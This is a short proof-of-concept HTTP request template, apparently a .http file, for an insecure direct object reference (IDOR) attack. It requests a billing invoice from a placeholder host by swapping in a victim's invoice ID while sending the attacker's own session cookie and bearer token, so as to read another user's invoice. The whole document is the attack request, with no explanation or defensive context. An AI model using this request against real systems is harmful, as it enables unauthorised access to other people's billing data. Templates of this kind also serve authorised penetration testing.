### IDOR PoC — GET Request (Horizontal)
### Save this as: get_idor_ENDPOINT.http

GET /api/billing/invoice?invoice_id=VICTIM_ID HTTP/1.1
Host: target.example.com
Accept: application/json
Cookie: session=ATTACKER_SESSION_TOKEN
Authorization: Bearer ATTACKER_TOKEN

